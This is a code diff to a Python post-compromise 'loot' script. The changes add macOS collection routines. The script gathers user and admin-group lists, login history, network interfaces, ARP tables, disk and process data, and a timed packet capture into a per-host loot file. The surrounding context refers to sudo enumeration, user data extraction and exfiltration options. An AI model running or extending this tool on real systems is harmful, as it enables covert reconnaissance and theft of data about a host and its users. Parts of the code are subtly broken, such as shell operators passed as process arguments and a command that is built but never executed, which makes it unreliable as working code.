@@ -1,4 +1,4 @@
-import re, sys, os, platform, socket, zipfile
+import re, sys, os, platform, socket, zipfile, time
 from subprocess import Popen, PIPE
 
 #
@@ -49,9 +49,9 @@ def lootme_stub(outfiles):
     elif platform.system() == 'Linux':
         print('Running on Linux...')
         outfiles = lootme_linux(outfiles)
-    elif platform.system() == 'OSX':
+    elif platform.system() == 'Darwin':
         print('Running on OSX...')
-        lootme_osx()
+        outfiles = lootme_osx(outfiles)
     else:
         print('OS not recognized. Exiting.')
     return outfiles
@@ -107,6 +107,25 @@ def lootme_linux(outfiles):
         
     return outfiles
 ### lootme_linux --end--
+
+### lootme_osx --start--
+def lootme_osx(outfiles):
+
+    hostloot = (platform.uname()[1]+'_loot.txt')
+    outfiles.append(hostloot)
+    with open(hostloot, 'w') as outFile:
+        # gather machine info
+        machine_info(outFile)
+        # gather user info
+        user_info_osx(outFile)
+        # gather network info
+        network_info_osx(outFile)
+        # gather disk info
+        disk_info_osx(outFile)
+        #gather process info
+        process_info_osx(outFile)
+    return outfiles
+### lootme_osx --end--
 
 ### Machine info --start--
 def machine_info(outFile):
@@ -171,6 +190,21 @@ def user_info_lin(outFile):
         filecontents_grab(outFile, path)
 ### User info Linux --end--
 
+### User info OSX --start--
+def user_info_osx(outFile):
+    pArgs = ["dscl", ".", "list", "/Users"]
+    execoutput_grab(outFile, pArgs)
+
+    pArgs = ["dscl", ".", "read", "/Groups/admin", "GroupMembership"]
+    execoutput_grab(outFile, pArgs)
+
+    pArgs = ["w"]
+    execoutput_grab(outFile, pArgs)
+
+    pArgs = ["last"]
+    execoutput_grab(outFile, pArgs)
+### User info OSX --end--
+
 ### Network info Linux --start--
 def network_info_lin(outFile):
     if os.path.isfile('/etc/sysconfig/network'):
@@ -202,14 +236,12 @@ def network_info_lin(outFile):
     except:
         try:
             pArgs = ["tcpdump", "&"]
-            execoutput_grab(outFile, pArgs)
+            execoutput_grab(outFile, pArgs, False)
             
             pArgs = ["sleep", "60s", "&&", "pkill", "-HUP", "-f", "tcpdump"]
             execoutput_grab(outFile, pArgs)
         except:
             print('\ntcpdump capture failed.\n')
-
-
 ### Network info Linux --end--
 
 ### Network info Windows --start--
@@ -236,6 +268,22 @@ def network_info_win(outFile):
     execoutput_grab(outFile, pArgs)
 ### Network info Windows --end--
 
+### Network info OSX --start--
+def network_info_osx(outFile):
+    pArgs = ["ifconfig"]
+    execoutput_grab(outFile, pArgs)
+
+    pArgs = ["arp", "-a"]
+    execoutput_grab(outFile, pArgs)
+
+    pArgs = ["tcpdump", "&"]
+    execoutput_grab(outFile, pArgs, False)
+
+    pArgs = ["sleep", "60s", "&&", "pkill", "-HUP", "-f", "tcpdump"]
+    execoutput_grab(outFile, pArgs)
+
+### Network info OSX --end--
+
 ### Disk info Linux --start--
 def disk_info_lin(outFile):
     pArgs = ["df"]
@@ -251,6 +299,18 @@ def disk_info_lin(outFile):
     if os.path.isfile(path):
         filecontents_grab(outFile, path)
 ### Disk info Linux --end--
+
+### Disk info OSX --start--
+def disk_info_osx(outFile):
+    pArgs = ["df"]
+    execoutput_grab(outFile, pArgs)
+
+    pArgs = ["diskutil", "list"]
+    execoutput_grab(outFile, pArgs)
+
+    pArgs = ["diskutil", "info", "-all"]
+
+### Disk info OSX --end--
 
 ### Process info Linux --start --
 def process_info_lin(outFile):
@@ -273,6 +333,16 @@ def process_info_lin(outFile):
     pArgs = ["sudo", "-l"]
     execoutput_grab(outFile, pArgs)
 ### Process info Linux --end--
+
+### Process info OSX --start--
+def process_info_osx(outFile):
+    pArgs = ["top", "-l", "1"]
+    execoutput_grab(outFile, pArgs)
+
+    pArgs = ["ps", "-ef"]
+    execoutput_grab(outFile, pArgs)
+
+### Process info OSX --end--
 
 ### User data extraction Linux --start--
 def userdata_extract_lin(outFile):
@@ -336,11 +406,6 @@ def logfile_ips(outFile):
                 outFile.write(str(ip)+'\n')
     return
 ### Log file IPs --end--
-
-### lootme_osx --start--
-def lootme_osx():
-    return
-### lootme_osx --end--
 
 ### exfil options --start--
 def exfil_options(outfiles):
@@ -472,12 +537,15 @@ def filecontents_grab(outFile,  contentfile):
 ### grab file contents --end--
 
 ### grab execution output --start--
-def execoutput_grab(outFile, pArgs):
+def execoutput_grab(outFile, pArgs, wait=None):     # Set the 'wait' arg to False if you want to open more subprocesses concurrently.
     try:
         outFile.write('\n'+pArgs[0]+' output:\n')
         p = Popen(pArgs, stdout=PIPE)
         (output,  err) = p.communicate()
-        exit_code = p.wait()
+        if wait is not False:
+            exit_code = p.wait()
+        else:
+            print("Not waiting for "+pArgs[0]+" to complete.")
         for line in output:
             outFile.write(line)
     except:
